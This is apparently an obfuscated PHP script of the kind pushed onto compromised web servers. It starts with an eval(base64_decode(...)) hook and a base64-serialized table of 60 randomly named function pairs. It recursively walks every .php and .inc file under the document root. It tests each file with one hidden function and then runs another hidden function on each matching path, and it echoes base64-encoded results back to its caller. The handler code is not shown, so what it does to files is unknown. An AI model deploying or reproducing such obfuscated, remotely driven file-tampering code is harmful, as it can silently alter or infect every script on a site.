eval(base64_decode(""));
$defs = unserialize(base64_decode("YTo2MDp7aTowO2E6Mzp7aTowO2k6MjtpOjE7czo1OiJyc21ncSI7aToyO3M6MTA6Imd1aXpxamdsb2EiO31pOjE7YTozOntpOjA7aTo1O2k6MTtzOjY6InJhYnVheSI7aToyO3M6OToiZ2hwZHNlYmt1Ijt9aToyO2E6Mzp7aTowO2k6MTU7aToxO3M6MTA6InJ0Y3hrbWNveXYiO2k6MjtzOjY6Imdkd2RveiI7fWk6MzthOjM6e2k6MDtpOjE4O2k6MTtzOjU6InJubHRwIjtpOjI7czo1OiJnc25tYyI7fWk6NDthOjM6e2k6MDtpOjIzO2k6MTtzOjExOiJydnJ4cnZkc3FlaSI7aToyO3M6OToiZ2xndnFraHBxIjt9aTo1O2E6Mzp7aTowO2k6MzY7aToxO3M6NDoicmJlZSI7aToyO3M6ODoiZ29ra2tpZXQiO31pOjY7YTozOntpOjA7aTo0MjtpOjE7czo1OiJyaW10cyI7aToyO3M6NzoiZ2FnaWV0dCI7fWk6NzthOjM6e2k6MDtpOjU0O2k6MTtzOjEwOiJyZ3V5eWtobG1wIjtpOjI7czoxMToiZ21kY2dldnd5YnMiO31pOjg7YTozOntpOjA7aTo2MDtpOjE7czo2OiJybGhyYmoiO2k6MjtzOjk6Imdxcmt6bnFkaSI7fWk6OTthOjM6e2k6MDtpOjg5O2k6MTtzOjU6InJsaGVzIjtpOjI7czo4OiJncXB4bnVybiI7fWk6MTA7YTozOntpOjA7aToxMDk7aToxO3M6OToicnNkamp1YndpIjtpOjI7czo5OiJnZHFsdGluZmEiO31pOjExO2E6Mzp7aTowO2k6MTEwO2k6MTtzOjQ6InJoZnoiO2k6MjtzOjg6Imdob2plb3NqIjt9aToxMjthOjM6e2k6MDtpOjExMTtpOjE7czoxMDoicmJqeHBic3NraiI7aToyO3M6MTA6ImdrcGV1YnFkamkiO31pOjEzO2E6Mzp7aTowO2k6MTEyO2k6MTtzOjk6InJ0bXRmaXRqYiI7aToyO3M6NToiZ3lpeHUiO31pOjE0O2E6Mzp7aTowO2k6MTE1O2k6MTtzOjEwOiJyaWdmanhtcW5pIjtpOjI7czo1OiJnbG16ZCI7fWk6MTU7YTozOntpOjA7aToxMTg7aToxO3M6MTA6InJkY2loeWJ3YWUiO2k6MjtzOjU6ImdpamV4Ijt9aToxNjthOjM6e2k6MDtpOjEyNjtpOjE7czoxMToicmF6ZXZlcnJkc3giO2k6MjtzOjc6ImdnZmhscG4iO31pOjE3O2E6Mzp7aTowO2k6MTI3O2k6MTtzOjg6InJocmhueWt0IjtpOjI7czo3OiJndmZmenBjIjt9aToxODthOjM6e2k6MDtpOjEzMDtpOjE7czo5OiJycnlpdnNxemMiO2k6MjtzOjExOiJnbWl6ZHl1ZnJjbyI7fWk6MTk7YTozOntpOjA7aToxMzQ7aToxO3M6NjoicndoYXlrIjtpOjI7czo1OiJnZ2RmbyI7fWk6MjA7YTozOntpOjA7aToxMzg7aToxO3M6NDoicmN3biI7aToyO3M6NjoiZ3dzcXVrIjt9aToyMTthOjM6e2k6MDtpOjE0NjtpOjE7czoxMDoicnpqbHJ5aGFmaSI7aToyO3M6NzoiZ3B0eHFzZiI7fWk6MjI7YTozOntpOjA7aToxNDg7aToxO3M6MTE6InJ1Y3hjcnhqeHNzIjtpOjI7czoxMDoiZ3Jobmtra2hrbiI7fWk6MjM7YTozOntpOjA7aToxNTc7aToxO3M6MTA6InJnZG1oc3VpeXQiO2k6MjtzOjU6ImdsY213Ijt9aToyNDthOjM6e2k6MDtpOjE2MztpOjE7czoxMDoicndvbHJnZ3J5dCI7aToyO3M6NDoiZ3J0dSI7fWk6MjU7YTozOntpOjA7aToxNjY7aToxO3M6OToicm5pbHZ0cHV2IjtpOjI7czo5OiJnZ2JnZndsbHIiO31pOjI2O2E6Mzp7aTowO2k6MTcyO2k6MTtzOjExOiJyeXNqa2R4Y2ttcyI7aToyO3M6MTE6Imd0dHN4cm5jc2VnIjt9aToyNzthOjM6e2k6MDtpOjE3NDtpOjE7czo0OiJyamRwIjtpOjI7czo4OiJnZGNpZXdwciI7fWk6Mjg7YTozOntpOjA7aToxNzk7aToxO3M6NDoicnRrdyI7aToyO3M6MTE6ImdlZWVja2JvdnNtIjt9aToyOTthOjM6e2k6MDtpOjE4NztpOjE7czo0OiJyYWhnIjtpOjI7czo0OiJna3J0Ijt9aTozMDthOjM6e2k6MDtpOjE4OTtpOjE7czoxMToicmF0c3phZWlwaWsiO2k6MjtzOjg6ImdsdXdnc2JmIjt9aTozMTthOjM6e2k6MDtpOjE5MjtpOjE7czo1OiJyanZhZSI7aToyO3M6NzoiZ21xcXJibyI7fWk6MzI7YTozOntpOjA7aToxOTY7aToxO3M6MTA6InJ3eGVsc29hZ3AiO2k6MjtzOjQ6ImdteWciO31pOjMzO2E6Mzp7aTowO2k6MTk4O2k6MTtzOjk6InJpbGd5bXJhZiI7aToyO3M6ODoiZ2VqYnFjd3MiO31pOjM0O2E6Mzp7aTowO2k6MTk5O2k6MTtzOjEwOiJyaG95dGVuYWZjIjtpOjI7czo3OiJna3J5bWhkIjt9aTozNTthOjM6e2k6MDtpOjIwMDtpOjE7czo1OiJyeWJmYyI7aToyO3M6NToiZ2R3dHIiO31pOjM2O2E6Mzp7aTowO2k6MjAxO2k6MTtzOjc6InJtbmxoZ3IiO2k6MjtzOjExOiJncHhobXphdW5iYyI7fWk6Mzc7YTozOntpOjA7aToyMDM7aToxO3M6NDoicmp4dCI7aToyO3M6NToiZ2twemciO31pOjM4O2E6Mzp7aTowO2k6MjA2O2k6MTtzOjg6InJndGF4cWxnIjtpOjI7czo4OiJnYXJ1cWVrdSI7fWk6Mzk7YTozOntpOjA7aToyMDk7aToxO3M6NzoicnRheHN3aiI7aToyO3M6NToiZ290YnAiO31pOjQwO2E6Mzp7aTowO2k6MjEwO2k6MTtzOjY6InJ6cmRsYyI7aToyO3M6ODoiZ3F2cW9jdXkiO31pOjQxO2E6Mzp7aTowO2k6MjEyO2k6MTtzOjEwOiJycGhhcHZpZXFxIjtpOjI7czo3OiJnb3hnZ29yIjt9aTo0MjthOjM6e2k6MDtpOjIxMztpOjE7czo1OiJyc21scCI7aToyO3M6OToiZ2tvZWNtZ2RkIjt9aTo0MzthOjM6e2k6MDtpOjIxNDtpOjE7czo5OiJyeGttZnJ2bXgiO2k6MjtzOjU6ImdoYndiIjt9aTo0NDthOjM6e2k6MDtpOjIxNTtpOjE7czo1OiJyZHljYSI7aToyO3M6OToiZ2FremNoZmV1Ijt9aTo0NTthOjM6e2k6MDtpOjIxNjtpOjE7czo1OiJyY3dyYiI7aToyO3M6OToiZ3NhbXZhenNlIjt9aTo0NjthOjM6e2k6MDtpOjIxNztpOjE7czo3OiJyaW1ubm94IjtpOjI7czo1OiJnYXVkdSI7fWk6NDc7YTozOntpOjA7aToyMTg7aToxO3M6MTA6InJoYW9pZXlqcmEiO2k6MjtzOjEwOiJnZ2J6cWFvcmtyIjt9aTo0ODthOjM6e2k6MDtpOjIxOTtpOjE7czo2OiJyZnVjbmEiO2k6MjtzOjExOiJnZ3BoY2NudXR3diI7fWk6NDk7YTozOntpOjA7aToyMjA7aToxO3M6NToicnNjcnkiO2k6MjtzOjc6ImdybWhxcWQiO31pOjUwO2E6Mzp7aTowO2k6MjIxO2k6MTtzOjExOiJybmJmcGRtc3hpZyI7aToyO3M6NDoiZ2p5ayI7fWk6NTE7YTozOntpOjA7aToyMjI7aToxO3M6MTE6InJva3hyeGhsYW1vIjtpOjI7czo0OiJnY296Ijt9aTo1MjthOjM6e2k6MDtpOjIyMztpOjE7czo4OiJyZXV2d25pdiI7aToyO3M6NDoiZ25hYyI7fWk6NTM7YTozOntpOjA7aToyMjQ7aToxO3M6MTE6InJ3cHpmcm51ZHpsIjtpOjI7czoxMDoiZ2FvZ3pocmxpbCI7fWk6NTQ7YTozOntpOjA7aToyMjU7aToxO3M6NzoicnFveWF1byI7aToyO3M6MTE6ImdveGdxcnd1YW5xIjt9aTo1NTthOjM6e2k6MDtpOjIyNjtpOjE7czo4OiJyaGJkb3djciI7aToyO3M6NToiZ3Joc2QiO31pOjU2O2E6Mzp7aTowO2k6MjI3O2k6MTtzOjExOiJyamt3cGJyc3VxbiI7aToyO3M6OToiZ3pra3FrcnlxIjt9aTo1NzthOjM6e2k6MDtpOjIyODtpOjE7czo1OiJyd3F1eCI7aToyO3M6NjoiZ3FjcXl6Ijt9aTo1ODthOjM6e2k6MDtpOjIyOTtpOjE7czo4OiJybWlzbnJxaCI7aToyO3M6ODoiZ2RwZ3V5cngiO31pOjU5O2E6Mzp7aTowO2k6MjMwO2k6MTtzOjg6InJnZ2lhbXNsIjtpOjI7czo2OiJneWdjamYiO319"));

function GetDocRoot()
{
    $docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
    if ($docroot_end === FALSE)
    {
        return $_SERVER['DOCUMENT_ROOT'];
    }
    elseif ($docroot_end === 0)
    {
        return "/";
    }
    else
    {
        return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
    }
}

function GetFileList($dir, $depth=1000000000)
{
    $result = array();

    $dir_count = 0;

    if ($depth < 1) {
        return $result;
    }

    $dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
    $h = @opendir($dir);
    if ($h === FALSE)
    {
        return $result;
    }

    while (($f = readdir($h)) !== FALSE)
    {
        if ($f !== '.' and $f !== '..')
        {
            $current_dir = "$dir/$f";
            if (is_dir($current_dir))
            {
                $dir_count += 1;

                $result = array_merge($result, GetFileList($current_dir, $depth / 10));
            }
            else
            {
                $path_parts = pathinfo($current_dir);
                if (isset($path_parts['extension']) && ($path_parts['extension']=="php" || $path_parts['extension']=="inc"))
                {
                    $result[] = $current_dir;
                }

            }
        }
    }

    closedir($h);

    return $result;
}

$res = Array();
foreach(GetFileList(GetDocRoot()) as $path)
{
    $content = @file_get_contents($path);
    foreach($defs as $def_item)
    {
        if($def_item[1]($content))
        {
            if (!array_key_exists($def_item[0], $res))
            {
                $res[$def_item[0]] = 0;
            }
            
            $res[$def_item[0]] += 1;
            
            $def_item[2]($path);
        }
    }
}

echo base64_encode(serialize($res));
exit();